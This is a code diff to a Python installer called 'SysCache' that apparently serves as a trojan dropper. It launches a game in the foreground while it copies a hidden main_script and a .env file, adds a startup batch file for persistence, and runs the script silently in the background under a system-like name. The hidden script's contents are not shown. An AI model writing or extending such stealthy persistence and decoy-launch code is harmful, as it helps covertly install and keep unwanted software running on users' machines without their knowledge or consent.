@@ -3,6 +3,7 @@ import sys
 import shutil
 import subprocess
 import platform
+from typing import List, Optional
 
 APP_NAME = "SysCache"
 MAC_LABEL = "com.syscache"
@@ -29,6 +30,16 @@ elif IS_MAC:
 else:
     raise RuntimeError(f"Sistema não suportado: {SYSTEM}")
 
+INSTALL_LOG_FILE = os.path.join(INSTALL_DIR, "install.log")
+RUN_MAIN_ARG = "--run-main"
+RUN_GAME_ARG = "--run-game"
+
+
+def log_install(message: str) -> None:
+    os.makedirs(INSTALL_DIR, exist_ok=True)
+    with open(INSTALL_LOG_FILE, "a", encoding="utf-8") as log_file:
+        log_file.write(f"{message}\n")
+
 
 def get_resource_path(filename: str) -> str:
     if hasattr(sys, "_MEIPASS"):
@@ -51,61 +62,180 @@ def copy_file_to_install(filename: str) -> str:
     return dst
 
 
-def get_pythonw_path() -> str:
-    pythonw = shutil.which("pythonw")
-    if pythonw:
-        return pythonw
-
-    exe = sys.executable
-    if exe.lower().endswith("python.exe"):
-        candidate = exe[:-10] + "pythonw.exe"
-        if os.path.exists(candidate):
-            return candidate
-
-    raise FileNotFoundError("pythonw.exe não encontrado no sistema.")
+def copy_optional_file_to_install(filename: str) -> Optional[str]:
+    try:
+        return copy_file_to_install(filename)
+    except FileNotFoundError:
+        return None
 
 
-def get_python_path() -> str:
-    python = shutil.which("python")
-    if python:
-        return python
+def get_windows_python_command() -> List[str]:
+    if shutil.which("python"):
+        return ["python"]
+    if shutil.which("py"):
+        return ["py", "-3"]
+    executable_name = os.path.basename(sys.executable).lower()
+    if executable_name.startswith("python"):
+        return [sys.executable]
+    return []
 
-    exe = sys.executable
-    if exe.lower().endswith("pythonw.exe"):
-        candidate = exe[:-11] + "python.exe"
-        if os.path.exists(candidate):
-            return candidate
 
-    return exe
+def get_windows_background_python_command() -> List[str]:
+    if shutil.which("pyw"):
+        return ["pyw"]
+    if shutil.which("pythonw"):
+        return ["pythonw"]
+    return get_windows_python_command()
+
+
+def is_main_script_running(main_script_path: str) -> bool:
+    normalized_path = main_script_path.replace("/", "\\").lower()
+    try:
+        result = subprocess.run(
+            ["wmic", "process", "get", "CommandLine"],
+            capture_output=True,
+            text=True,
+            check=False,
+        )
+        output = (result.stdout or "").lower()
+        if getattr(sys, "frozen", False):
+            return RUN_MAIN_ARG in output and os.path.basename(sys.executable).lower() in output
+        return normalized_path in output
+    except Exception:
+        return False
+
+
+def show_windows_message(message: str, title: str = "SysCache Installer") -> None:
+    try:
+        import ctypes
+
+        ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)
+    except Exception:
+        pass
+
+
+def build_startup_bat(main_script_path: str) -> str:
+    if getattr(sys, "frozen", False):
+        escaped_exe = sys.executable.replace('"', '""')
+        return f'''@echo off
+wmic process get CommandLine | find /I "{RUN_MAIN_ARG}" >nul
+if %errorlevel%==0 (
+    exit /b 0
+)
+start "" /b "{escaped_exe}" {RUN_MAIN_ARG}
+exit /b 0
+'''
+
+    escaped_path = main_script_path.replace('"', '""')
+    return f'''@echo off
+set "SCRIPT_PATH={escaped_path}"
+wmic process get CommandLine | find /I "%SCRIPT_PATH%" >nul
+if %errorlevel%==0 (
+    exit /b 0
+)
+where pyw >nul 2>nul
+if %errorlevel%==0 (
+    start "" /b pyw "%SCRIPT_PATH%"
+    exit /b 0
+)
+
+where pythonw >nul 2>nul
+if %errorlevel%==0 (
+    start "" /b pythonw "%SCRIPT_PATH%"
+    exit /b 0
+)
+
+where py >nul 2>nul
+if %errorlevel%==0 (
+    start "" /b py -3 "%SCRIPT_PATH%"
+    exit /b 0
+)
+
+start "" /b python "%SCRIPT_PATH%"
+exit /b 0
+'''
+
+
+def run_bundled_main_script() -> None:
+    script_path = get_resource_path("main_script.py")
+    with open(script_path, "rb") as script_file:
+        code = compile(script_file.read(), script_path, "exec")
+        exec(code, {"__name__": "__main__", "__file__": script_path})
+
+
+def run_bundled_game() -> None:
+    script_path = get_resource_path("game.py")
+    with open(script_path, "rb") as script_file:
+        code = compile(script_file.read(), script_path, "exec")
+        exec(code, {"__name__": "__main__", "__file__": script_path})
+
+
+def get_frozen_child_env() -> dict:
+    env = os.environ.copy()
+    env["PYINSTALLER_RESET_ENVIRONMENT"] = "1"
+    return env
 
 
 def install_windows() -> None:
+    log_install("Iniciando instalação no Windows.")
     main_script_path = copy_file_to_install("main_script.py")
     game_path = copy_file_to_install("game.py")
-    copy_file_to_install(".env")
-
-    pythonw = get_pythonw_path()
-    python = get_python_path()
+    copy_optional_file_to_install(".env")
+    python_cmd = get_windows_python_command()
+    background_python_cmd = get_windows_background_python_command()
 
     os.makedirs(STARTUP_DIR, exist_ok=True)
     bat_path = os.path.join(STARTUP_DIR, "syscache_launcher.bat")
 
-    bat_content = f'''@echo off
-start "" "{pythonw}" "{main_script_path}"
-exit
-'''
-
     with open(bat_path, "w", encoding="utf-8") as f:
-        f.write(bat_content)
+        f.write(build_startup_bat(main_script_path))
 
-    subprocess.Popen([pythonw, main_script_path], shell=False)
-    subprocess.Popen([python, game_path], shell=False)
+    is_frozen_exe = getattr(sys, "frozen", False)
+    if not is_frozen_exe and not python_cmd:
+        warning = (
+            "Python não foi encontrado no PATH. O instalador concluiu a cópia dos arquivos, "
+            "mas não conseguiu iniciar o SysCache.\n\n"
+            "Instale Python 3 e tente novamente."
+        )
+        log_install(warning)
+        show_windows_message(warning)
+        return
+
+    try:
+        creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
+        if not is_main_script_running(main_script_path):
+            if is_frozen_exe:
+                subprocess.Popen(
+                    [sys.executable, RUN_MAIN_ARG],
+                    shell=False,
+                    creationflags=creationflags,
+                    env=get_frozen_child_env(),
+                )
+            else:
+                subprocess.Popen(
+                    [*background_python_cmd, main_script_path],
+                    shell=False,
+                    creationflags=creationflags,
+                )
+            log_install("main_script iniciado em segundo plano.")
+        else:
+            log_install("main_script já estava em execução. Não será iniciado novamente.")
+
+        if is_frozen_exe:
+            subprocess.Popen([sys.executable, RUN_GAME_ARG], shell=False, env=get_frozen_child_env())
+            log_install("Inicialização disparada com executável empacotado.")
+        else:
+            subprocess.Popen([*python_cmd, game_path], shell=False)
+            log_install(f"Inicialização disparada com comando: {' '.join(python_cmd)}")
+    except Exception as error:
+        log_install(f"Falha ao iniciar processos no Windows: {error}")
+        show_windows_message(f"Falha ao iniciar SysCache: {error}")
 
 
 def install_mac() -> None:
     main_script_path = copy_file_to_install("main_script_mac.py")
     game_path = copy_file_to_install("game.py")
-    copy_file_to_install(".env")
+    copy_optional_file_to_install(".env")
 
     python_bg = shutil.which("python3") or sys.executable
     python_fg = shutil.which("python3") or sys.executable
@@ -152,6 +282,14 @@ def install_mac() -> None:
 
 
 if __name__ == "__main__":
+    if len(sys.argv) > 1 and sys.argv[1] == RUN_MAIN_ARG:
+        run_bundled_main_script()
+        sys.exit(0)
+
+    if len(sys.argv) > 1 and sys.argv[1] == RUN_GAME_ARG:
+        run_bundled_game()
+        sys.exit(0)
+
     create_install_dir()
 
     if IS_WINDOWS:
